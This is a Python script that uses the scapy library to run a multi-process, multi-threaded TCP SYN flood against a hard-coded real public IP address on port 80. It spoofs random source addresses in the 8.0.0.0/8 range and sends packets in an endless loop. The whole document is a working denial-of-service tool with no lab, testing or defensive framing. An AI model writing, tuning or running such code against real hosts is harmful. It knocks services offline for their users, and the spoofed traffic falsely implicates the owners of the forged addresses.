from scapy.all import Ether, IP, TCP, sendp
from multiprocessing import Process
import threading
import random

dst_ip = "8.8.8.8"  # Target IP
iface_name = "Ethernet"   # Network interface

# Function to generate random public IP address (within a chosen public IP range)
def random_public_ip():
    # Example range: 8.0.0.0 - 8.255.255.255
    return f"8.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"

def send_loop():
    while True:
        # Randomize source IP and source port
        src_ip = random_public_ip()  # Randomize source public IP
        src_port = random.randint(1024, 65535)  # Randomize source port
        
        # Create the SYN packet with a random source IP and source port
        pkt = Ether() / IP(src=src_ip, dst=dst_ip) / TCP(dport=80, sport=src_port, flags="S")
        
        # Send the packet
        sendp(pkt, iface=iface_name, verbose=False)

def worker(thread_count=6):  # Use 6 threads per process
    threads = []
    for _ in range(thread_count):
        t = threading.Thread(target=send_loop)
        t.daemon = True
        t.start()
        threads.append(t)
    # Keep the process alive
    for t in threads:
        t.join()

if __name__ == "__main__":
    process_count = 6  # Adjust to your number of CPU cores
    threads_per_process = 6  # Tweak for performance (6 threads per process)

    processes = []
    for _ in range(process_count):
        p = Process(target=worker, args=(threads_per_process,))
        p.start()
        processes.append(p)

    for p in processes:
        p.join()
